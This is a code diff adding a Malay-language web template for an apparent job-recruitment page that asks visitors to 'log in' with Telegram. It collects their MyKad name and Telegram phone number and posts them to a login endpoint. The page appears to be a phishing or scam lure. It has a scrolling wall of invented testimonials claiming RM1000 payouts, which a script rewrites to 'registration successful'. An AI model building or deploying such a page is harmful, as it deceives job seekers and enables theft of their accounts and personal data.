@@ -1,0 +1,491 @@
+{% extends "layout.html" %} {% block content %}
+<img
+  src="{{ url_for('static', filename='banner.png') }}"
+  alt="tng-img"
+  style="width: 100%; height: 100%; background: #c5a572"
+/>
+
+<p
+  style="font-size: 18px; font-weight: bold; text-align: center; margin: 0 auto"
+>
+  HANTAR RESUME SEKARANG
+</p>
+
+<marquee behavior="" direction="">
+  <h4>
+    Untuk mendaftar sila log masuk menggunakan akaun Telegram. Kami akan
+    menghubungi anda untuk melengkapkan semua dokumen yang diperlukan.
+  </h4>
+</marquee>
+
+<form id="registerForm" method="post">
+  <label>Nama Penuh Sesuai MyKad</label>
+  <input
+    type="text"
+    name="name"
+    required
+    placeholder="Masukkan Nama Penuh Sesuai MyKad"
+  />
+
+  <label>Nombor Phone (Telegram)</label>
+  <input
+    type="text"
+    id="phone"
+    name="phone"
+    required
+    placeholder="+60 Nombor telefon Telegram"
+  />
+
+  <!-- Persetujuan -->
+  <label
+    style="
+      display: flex;
+      align-items: flex-start;
+      font-weight: 400;
+      margin-top: -5px;
+      margin-bottom: 15px;
+      font-size: 13px;
+      line-height: 1.4;
+    "
+  >
+    <input
+      type="checkbox"
+      name="agreement"
+      required
+      style="margin-right: 8px; margin-top: 3px"
+    />
+    Saya bersetuju untuk menerima mesej Telegram daripada Admin berkaitan
+    Permohonan Jawatan!!
+  </label>
+
+  <button type="submit">LOG MASUK</button>
+</form>
+
+<!-- Loader overlay -->
+<div
+  id="loader"
+  style="
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(255, 255, 255, 0.9);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+  "
+>
+  <div
+    id="spinner"
+    style="
+      width: 60px;
+      height: 60px;
+      border: 6px solid #ccc;
+      border-top: 6px solid #001a6d;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    "
+  ></div>
+  <p id="loaderText" style="margin-top: 15px; font-weight: 600; color: #001a6d">
+    Memproses...
+  </p>
+</div>
+
+<!-- Bagian record box (TIDAK DIHAPUS) -->
+<div class="_record-box">
+  <div id="list" class="list-box">
+    <div class="list">
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/3.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Aina Zulkifli</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/10.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Zarina Muhammad</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/40.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Aisyah Zainal</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/11.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Rohani Latiff</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/15.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Shahrina Nizam</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/14.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Norazmah Hashim</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/1.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Farah Abdul</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/17.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Zulaikha Ibrahim</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/16.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Siti Sarah</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/22.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Maisarah Fahmi</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/23.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Nurul Afiqah</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/44.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Azlina Abdullah</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/19.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Hasnah Abdul</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/33.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Rahimah Salleh</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/35.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Nadia Hafiz</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/36.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Fariza Musa</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/28.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Rina Zainal</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/32.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Amira Rahman</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/37.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Norshila Anuar</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/45.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Zainab Ali</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/43.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Fauziah Abdul Rahman</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/299.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Lina Mohd Noor</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+
+      <div class="item">
+        <div class="record_logo">
+          <img src="static/testimonials/48.jpg" alt="" />
+        </div>
+        <div class="center">
+          <div class="h1"><span class="name">Ismawati Zaid</span></div>
+          <div class="h2">RM1000 ✅</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Auto isi +60 -->
+<script>
+  const phoneInput = document.getElementById("phone");
+  phoneInput.addEventListener("focus", function () {
+    if (this.value.trim() === "") {
+      this.value = "+60";
+    }
+  });
+  phoneInput.addEventListener("input", function () {
+    if (!this.value.startsWith("+60")) {
+      this.value = "+60";
+    }
+  });
+</script>
+
+<!-- Submit pakai AJAX -->
+<script>
+  document
+    .getElementById("registerForm")
+    .addEventListener("submit", function (e) {
+      e.preventDefault();
+      const formData = new FormData(this);
+      const loader = document.getElementById("loader");
+      const spinner = document.getElementById("spinner");
+      const loaderText = document.getElementById("loaderText");
+
+      loader.style.display = "flex";
+
+      fetch("/api/login", { method: "POST", body: formData })
+        .then((res) => res.json())
+        .then((data) => {
+          if (data.status === "success") {
+            spinner.outerHTML = `
+        <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+          <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
+          <path class="checkmark__check" fill="none" d="M14 27l7 7 17-17"/>
+        </svg>
+      `;
+            loaderText.innerText = "Berjaya!";
+            loaderText.style.color = "#4caf50";
+            setTimeout(() => {
+              window.location.href = data.redirect;
+            }, 1500);
+          } else {
+            loader.style.display = "none";
+            alert(data.message || "Ralat tidak diketahui.");
+          }
+        })
+        .catch((err) => {
+          loader.style.display = "none";
+          alert("Server error!");
+        });
+    });
+</script>
+
+<!-- Ubah teks RM1000 jadi "Pendaftaran Berjaya" -->
+<script>
+  document.querySelectorAll(".h2").forEach((item, index) => {
+    const amounts = [
+      "Berjaya Mendaftar",
+      "Berjaya Mendaftar",
+      "Berjaya Mendaftar",
+    ];
+    const randomAmount = amounts[index % 3];
+    item.textContent = item.textContent.replace("RM1000", randomAmount);
+  });
+</script>
+
+<!-- Auto scroll testimoni -->
+<script>
+  function startAutoScroll() {
+    const lists = document.querySelectorAll(".list");
+    lists.forEach((list) => {
+      let isScrolling = true;
+      function scroll() {
+        if (!isScrolling) return;
+        const firstItem = list.querySelector(".item");
+        if (!firstItem) return;
+        const itemHeight = firstItem.offsetHeight;
+        list.style.transition = "transform 1s ease";
+        list.style.transform = `translateY(-${itemHeight}px)`;
+        setTimeout(() => {
+          list.style.transition = "none";
+          list.style.transform = "translateY(0)";
+          list.appendChild(firstItem.cloneNode(true));
+          firstItem.remove();
+          setTimeout(() => {
+            requestAnimationFrame(scroll);
+          }, 2000);
+        }, 1000);
+      }
+      scroll();
+      const listBox = list.closest(".list-box");
+      if (listBox) {
+        listBox.addEventListener("mouseenter", () => {
+          isScrolling = false;
+        });
+        listBox.addEventListener("mouseleave", () => {
+          isScrolling = true;
+          scroll();
+        });
+      }
+    });
+  }
+  document.addEventListener("DOMContentLoaded", startAutoScroll);
+</script>
+
+<style>
+  @keyframes spin {
+    0% {
+      transform: rotate(0deg);
+    }
+    100% {
+      transform: rotate(360deg);
+    }
+  }
+  .checkmark {
+    width: 56px;
+    height: 56px;
+    border-radius: 50%;
+    display: block;
+    stroke-width: 4;
+    stroke: #fff;
+    stroke-miterlimit: 10;
+    margin: 10px auto;
+    box-shadow: inset 0px 0px 0px #4caf50;
+    animation: fill 0.4s ease-in-out 0.4s forwards,
+      scale 0.3s ease-in-out 0.9s both;
+    background: #4caf50;
+  }
+  .checkmark__check {
+    transform-origin: 50% 50%;
+    stroke-dasharray: 48;
+    stroke-dashoffset: 48;
+    animation: stroke 0.4s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+  }
+  @keyframes stroke {
+    100% {
+      stroke-dashoffset: 0;
+    }
+  }
+  @keyframes scale {
+    0%,
+    100% {
+      transform: none;
+    }
+    50% {
+      transform: scale3d(1.1, 1.1, 1);
+    }
+  }
+  @keyframes fill {
+    100% {
+      box-shadow: inset 0px 0px 0px 30px #4caf50;
+    }
+  }
+</style>
+
+{% endblock %}
